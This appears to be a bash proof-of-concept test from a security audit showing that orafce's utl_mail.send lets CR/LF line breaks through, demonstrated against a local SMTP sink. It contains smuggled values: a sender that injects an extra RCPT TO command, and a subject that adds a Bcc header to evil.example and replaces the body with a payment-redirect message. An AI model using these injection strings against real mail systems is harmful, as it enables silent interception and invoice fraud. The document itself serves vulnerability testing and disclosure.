#!/bin/bash
#
# Issue 02 - nothing rejects a line break in a header or an address
#
# Every string the caller supplies for a header (subject, cc, bcc, replyto,
# mime_type, ...) is concatenated straight into the header block, and sender
# and recipients are handed to libcurl as MAIL FROM and RCPT TO arguments.
# A CR LF in any of them ends the header, or the SMTP command, it was placed
# in, and everything after the break is read as whatever comes next:
#
#   - a line break in sender or recipients produces additional SMTP commands,
#     so the message is delivered to an address the caller never named;
#   - a line break in subject (or cc, bcc, replyto, mime_type) adds headers of
#     the attacker's choosing, and a second one ends the header block and lets
#     the whole message body be replaced.
#
# This matters because these procedures are exactly what an application wraps
# around user-supplied data: a "subject" taken from a web form is enough.

. "$(dirname "$0")/lib.sh"

require_psql
start_sink

url="$(sink_url)"
found=0

head1 "a line break in 'sender' injects an SMTP command"
psql -X -q -v ON_ERROR_STOP=0 >"$WORK/psql.log" 2>&1 <<SQL
SET orafce_mail.smtp_server_url = '$url';
CALL utl_mail.send(sender     => e'good@example.com>\r\nRCPT TO:<smuggled@evil.example',
                   recipients => 'recipient@example.com',
                   message    => 'body');
SQL

if sink_session | grep -q '^C: RCPT TO:<smuggled@evil.example>'; then
	say "the server was told to deliver to an address that was never passed in:"
	sink_session | grep '^C: ' | sed 's/^/    /'
	found=1
else
	say "no injected envelope command"
fi

: >"$SINK_LOG"

head1 "a line break in 'subject' injects headers and replaces the body"
psql -X -q -v ON_ERROR_STOP=0 >>"$WORK/psql.log" 2>&1 <<SQL
SET orafce_mail.smtp_server_url = '$url';
CALL utl_mail.send(sender     => 'good@example.com',
                   recipients => 'recipient@example.com',
                   subject    => e'Invoice\r\nBcc: silent@evil.example\r\n\r\nPlease pay evil.example instead.\r\nX-Ignored:',
                   message    => 'The real message.');
SQL

say "what the server received:"
sink_session | sed 's/^/    /'

if sink_session | grep -q '^Bcc: silent@evil.example'; then
	say ""
	say "-> 'Bcc: silent@evil.example' is a header the caller never asked for"
	found=1
fi
if sink_session | grep -q '^Please pay evil.example instead.'; then
	say "-> the injected text landed in the message body"
	found=1
fi

[ "$found" -eq 1 ] &&
	bug "CR/LF in header and address arguments is passed through unchecked"

ok "line breaks in header and address arguments are rejected"
